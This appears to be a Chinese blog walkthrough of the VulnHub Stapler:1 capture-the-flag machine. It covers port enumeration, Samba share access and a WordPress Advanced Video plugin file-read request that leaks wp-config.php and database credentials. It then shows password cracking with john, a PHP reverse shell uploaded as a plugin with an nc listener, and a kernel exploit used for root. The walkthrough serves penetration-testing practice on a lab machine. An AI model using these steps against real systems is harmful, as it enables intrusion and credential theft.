> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dWXKlHnf2zAlTM_IOsHphg)

![](https://mmbiz.qpic.cn/mmbiz_png/Hju2o35jBmTq6KFH2V0l2rpO9o6GicBiaYibgkMVJKERutggHic6HP3Cv9MbAmNwCsjW8knnZZgmA1yceegAFSN4OA/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/stapler-1,150/

靶机难度：中级（CTF）

靶机发布日期：2016 年 6 月 8 日

靶机描述：Stapler is reported to be one of several vulnerable systems that are supposed to assist penetration testers with challenges similar to Offensive Security’s PWK coursework.

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/IhUDNJicR5NCFnPJhYUTqib6NmY4leia2t3Fs2QenHUiaZRPguibTFokOE3Lput5g5a5tTlkf5GagGpiaojrZrVtnXvA/640?wx_fmt=png)

  

  

一、信息收集

  

  

描述：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv61ME5AZhsxicB3QQQkjC9YrggyDlC4FVqDpH0pzVhG1p7tlooWeuFzw/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvjmgvMZ1SXicyloL8Uu0IDfCCtZvfQsicZzztUdI7ghMKupoHYEG2YdicA/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.101

这台靶机只能 Vb 打开，不太习惯，这边只能把网络设置成桥接了 Vb 和 VM 一起将就用....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv35Xc92ZmgrXeaFaNeoB4kOL9gjWmv6u8shhnKFCSicAcZEf8Vu9h6aQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvdYEmxC7wJqVLFp0x4Hnsf2YHEoTibiaVSryyUG4OxQyWMj7fIibxMrcgA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvlIQ0oqnQBiauGOAXpciceiaoBWfzumBfU4xNoI6m3z4cibyIv0nChzib2tQ/640?wx_fmt=png)

命令：

```
nmap -sS -sV -T5 -A -p- 192.168.56.101
```

可以看到有很多容易受到攻击的端口都开着，FTP、NetBIOS、、MySQL 和运行 Web 服务器（Apache HTTPD）的端口 12380 等等

端口多了就从第一个端口入手吧...

nmap 扫描结果：

```
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

可以匿名登录的意思

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv4yLF550hcERIAeye2aD2OaTJEUfD03N5lcgyicX3BlgGR66fiaIfREibw/640?wx_fmt=png)    

我们登录后，进去发现只能匿名访问，不能写.... 查看有个 note 文件，下载到本地继续查找信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvca3ON6AsOXqDd4WiagNLro99Fkialib28MekXeicTUVPrXibqicjQyR0UHibw/640?wx_fmt=png)

Elly 描述请确保更新了有效负载信息，完成后将其保留在您的 FTP 帐户中，John，获得两个用户名... 没有密码，先保留信息.... 继续 22 端口渗透...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvqN3E7t2INhBLJ0Z2qqVuOhIJTbVZSnTFPk0eVibGj2yCdXTCGcZAx2w/640?wx_fmt=png)

无法直接登录，跳过...

检查 80 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvcX5aAABgbrwKvnnfmCpzib3y8bHgMUCa15TUObIibx8xIDprL8n02lpQ/640?wx_fmt=png)

nikto（开源 WEB 安全扫描器）进行扫描试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvd2ekcosiazQ8AzUxsgxiaGCBAC7auMAzFuO4Miaziaib23DG5j9ftdz97Rw/640?wx_fmt=png)

抓取这两个数据也没啥信息....

nmap 扫描出的信息：

```
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
```

看看 139 的 Samba 信息，这是一个开放的 netbios-ssn，用 smbclient 来查看（属于 samba 套件，它提供一种命令行使用交互式方式访问 samba 服务器的共享资源）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvSsfMWuQ5oIu3CQsA50GIicatDHicZVaLI1o7nbl0rQyCPOEYuwnXcy4A/640?wx_fmt=png)

Enum4linux 是一个用于枚举来自 Windows 和 Samba 系统的信息的工具

或者使用 enum4linux 来查看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvQJ7v7yHOaEZPuG7ehUZCgN7L8E1VlOpGaP3KD6spUm4GufSlmx7ibdg/640?wx_fmt=png)

命令：

```
enum4linux 192.168.56.101 >dayu.out
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvkicIOyF059mbicicFydicc5dRS8lPtdU5iaRPptHdDGUV1CB06aUao7oFGg/640?wx_fmt=png)

两种方式都可以看到两个活跃的用户...kathy、tmp

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvE7eONDz2UmmtVl3M6uoibXaGtnGcBicnUIwgdH0NkqheG7llYQF0kp5A/640?wx_fmt=png)

命令：

```
smbclient //fred/kathy -I 192.168.56.101 -N
```

使用 smbclient 连接到此共享，并看到有两个文件夹 kathy_stuff 和 backup...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvQ7qYYzvcFGLsCMfrRXodprWx1Hzo30HyVV04KqaYKibib2w5LocOSyvw/640?wx_fmt=png)

发现 todo-list.txt

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvH3AS2ib19jHXaVMgtvmkWEdFryhFuExWG1GJVEQib6dicrRXSyfRAOI2Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvumAwyFBZiaw6AmpwQhZUkZEqOzqCXsicbic6jJ7Pia6rAwjKeBVbQ6ibL6w/640?wx_fmt=png)

直接将文件拷入本地...

继续访问 tmp

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvq6IuOCENO9bKsjoqLkyaTQZUaFIzpfFL9kAKwWSiaFiaiacMibQIkichkhA/640?wx_fmt=png)

命令：

```
smbclient //fred/tmp -I 192.168.56.101 -N
```

这里竟然有个文件叫 LS（和查询一样容易忽略），下载到本地

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvraxedznLySxu2SEq1TzYicMSr16rcRgBPiaaDYEkSRuERDSDLuSNnNog/640?wx_fmt=png)

Kathy 用户

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvqLjbC1MVWUrw0EX5DOwf3ab98Chtlck9Gd901SU312jL0fPF1t02JA/640?wx_fmt=png)

这里的意思是

亲爱的凯西，您还应该在 WordPress 根文件夹中备份 wp-config.php 文件....

nmap 扫描结果：

```
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
```

这里尝试登陆 mysql...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvK7bdkeFPmFJfOtFYPnPj0XTZPn8lKvLU5nY4tvdy9X0iajXKAragZow/640?wx_fmt=png)

测试了几次猜的密码，登不上去，算了...

继续下一个端口...

  

  

二、web 渗透

  

  

nmap 扫描结果:

```
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvTILB6cTLJMpOjciaqLOKFHQAyl1ByWKxydle9NaZMCJm2xUrJMHNLeg/640?wx_fmt=png)

查看前端源代码

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv7Tia8keqjxt6LXZPTQ8zUgPibib9FMWemVSb8tnA6amyqibRmRLibicYsdwg/640?wx_fmt=png)

发现 Zoe 用户

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv26EAVLcKTYaLm21WZhvlquCRpaJz4wDz1EyAUsumgh7SIktW0kK2Uw/640?wx_fmt=png)

命令：

```
nikto -h 192.168.1.13:12380
```

运行 nikto 查看下网站信息，发现存在三个目录 / admin112233/，/blogblog / 和 / phpmyadmin/

http 访问都是正常页面... 返回 nmap 扫描的结果可以看出，存在 https 方式访问

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvIlXVSRO7ylHmA3RibWx8kaiau6UcDzuJ7PZDwib0P3uiaFqibPVQ48sL0Ag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvA0Ag6L1rojicdhLeriaPrbpBUYegHDqAnoJ5kNAF4uLLgJgLG0s4HibXQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvSP3hPnKvibX9Sae3hMXfh2E5IA2ODgzdN7eq7yhk5CAgZXPe2oxd5fQ/640?wx_fmt=png)

```
Wordpress 4.2.2
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvROfwk7ibgzesm90sU0tVS5ubXYDklAaTcvgJSiaUWHia5HwOv7waXFVAQ/640?wx_fmt=png)

admin112233 目录将我重定向到 xss-payloads.com，blogblog 让我进入了 WordPress 的博客...

对 WordPress 实例运行 wpscan 并枚举所有用户，这边是局域网就不截图了，真是很无奈...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvnN18b69rSbERUFQ0akicLKfBmZbiajCRyshtCDLcZxjVF32BeI9iaSKOg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvssKyRnmDwQBs9kiamCZ4Nw7JeU1XbBoVXqwoJFYNQV9GbIaUicbesia5Q/640?wx_fmt=png)

命令：

```
wpscan --url https://192.168.1.13:12380/blogblog/ --enumerate uap
```

因为局域网原因，我在 vb 上执行得命令，坑爹...

发现 wp-content 和 wp-includes 两个目录... 和 XSS 漏洞，路径遍历漏洞和一些插件... 还发现嵌入式视频或者播放列表，可以执行 LFI 漏洞攻击

先访问目录看看把

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv91UlScNfdrk4kiaoyS1bU10PfNzpFGgy8HmyBib7Q0hryoPicEwDdXeJQ/640?wx_fmt=png)

advanced video

这边得到信息：

```
Wordpress 4.2.2 videos exploit，去谷歌搜索能利用的exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvYWshaoQ72Oj4dDaIbciakdbyjPtJibic6fJPPAJc9movlqrNLLaVwjDibA/640?wx_fmt=png)

或者 kali 搜索

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvwicHHHicIHcEXe4KGBZKSxbm2m9IwDCPrtyFs55VrTRHxb66hS8PRP4w/640?wx_fmt=png)

了解下 python 写的 exp，学习学习

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvZFrhm3SGPZV7L4ACUrS0SevKmpmmcHYqyMF783zdzMmM0OtzAbkbmA/640?wx_fmt=png)

这边利用 39646.c 代码中的：

```
http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
Exploit - Print the content of wp-config.php in terminal (default Wordpress config)
```

直接访问

```
http://192.168.56.108/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/var/
```

页面内容会出现一个地址：

```
https://192.168.56.108/blogblog/?p-250（访问）
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv16BRIl7yKQiaHvTud6hBYJewibR2ZX1dwc0v8deprmHvuibjGesCSX3BQ/640?wx_fmt=png)

下载后查看

  
![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvRCpeSKLNcZGNWddIbJMWOcEzmibY3C9O0RpYxTMj6icz0jUR8AravRJQ/640?wx_fmt=png)

```
root/plbkac
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvP8G1flvFInsMzGjaxpyMoKjkpnGQjQC8ibibyIhONOCf6HqSwmYlv6fw/640?wx_fmt=png)

登录数据库

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvRuGwmWGznvPZ5PttokOiaYvGZTGWUfKdtV18DhC5Y3Om6MxibehiaL8nQ/640?wx_fmt=png)

转到 WordPress 并检索用户

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvYwkOqYpKSxqAyJT5xB4uttPnAJSF2sojniaiaqicC5LSzFxQ8j6s1LIvg/640?wx_fmt=png)

将文件拷出放到文本，然后扫选出 user_pass 值

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvLp7tcibLib7ibojxQbjRo96DoK7vetVDuicibeMkeeltCHWCfJRD5Hr4bZQ/640?wx_fmt=png)

命令：

```
awk -F'|' '{print $4}' dayu.txt.txt
```

复制黏贴将值继续放入文本

使用 john 的 rockyou.txt 破解密码：

```
reliably
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv9opAE2fr2py1rM0H5BVgz3hMIoL34iaZo0ySHG1vPaIibBvGNl3Uh6Ow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBv1hyOjLQfxZVWCSqRzxvSuYr4p34AjczG8Er2SLGeQRBG6WwKB101iag/640?wx_fmt=png)

通过 install plugins 函数写了个 php 反向外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvDZtQssibcfBIr3rnzyRZeibvEmy7sxiagNakXctbdQooibxLdkfjyM0qOQ/640?wx_fmt=png)

上传 php

然后本地 nc 开启 443

获得 www-data 低权限然后运行 uname -a，发现内核版本为 4.4... 不多说

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvE2wbRLgJN2g5zXuU8N9Kzpo5jOJUia2UN3RyDKK2RibczAM6x4fCgYYg/640?wx_fmt=png)

使用这个 39772.c 的 exp，提权！！（不多做介绍了，后面文章也是慢慢减少步骤，前期文章都有写很详细）

然后上传到靶机，执行即可提权 ROOT

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOPWicz5ChQJgSNCWyGbSSBvGEF1cxgQTWTTial4E7zM5cX8n68vA61D8Yx0wxfkKBOLG5430bEwqJQ/640?wx_fmt=png)

```
flag：b6b545dc11b7a270f4bad23432190c75162c4a2b
```

![](https://mmbiz.qpic.cn/mmbiz_png/Hju2o35jBmTq6KFH2V0l2rpO9o6GicBiaYibgkMVJKERutggHic6HP3Cv9MbAmNwCsjW8knnZZgmA1yceegAFSN4OA/640?wx_fmt=png)

由于我们已经成功得到 root 权限 & 找到 6 个 flag.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/IhUDNJicR5NCFnPJhYUTqib6NmY4leia2t3Fs2QenHUiaZRPguibTFokOE3Lput5g5a5tTlkf5GagGpiaojrZrVtnXvA/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

星球每月都有网络安全书籍赠送、各种渗透干货分享、小伙伴们深入交流

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvyRzpZ9K5N6QrjibbJsVd3xX7Q4wDYSsBJYyNJdyjYabp5NkcDj9GEhA/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

渗透攻防：  

欢迎加入

大余安全

公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvX3CVuhiba4mw8DqJicOMwaDJyErymjibZhiaZNKMtWzn2rX17pcK3Cd7Cw/640?wx_fmt=png)